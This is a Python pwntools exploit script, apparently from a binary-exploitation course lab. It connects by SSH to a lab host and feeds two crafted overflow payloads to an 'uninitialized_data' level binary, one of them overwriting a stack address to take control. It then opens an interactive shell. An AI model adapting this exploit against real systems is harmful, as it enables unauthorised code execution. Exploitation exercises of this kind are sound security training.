import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lecture", password="lecture")
  sh = session.process("/bin/sh", env={"PS1":""})

  sendget(sh, "/levels/lecture/misc/uninitialized_data")

  input("READY")

  offset = b"A" * 481
  cookie = struct.pack('<L', 0x41414141)
  rest   = b"C" * (1000 - (
    len(offset) +
    len(cookie)
    )
  )
  payload = offset + cookie + rest
  sendget(sh, payload)
   
  offset = b"B" * 996
  edi    = struct.pack('<L', 0xbffff7cc)
  rest   = b"C" * (1020 - (
    len(offset) +
    len(edi)
    )
  )
  payload = offset + edi + rest
  sendget(sh, payload, True)

  sh.interactive()

  return

def sendget(sh, message, print_output=False):
  
  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
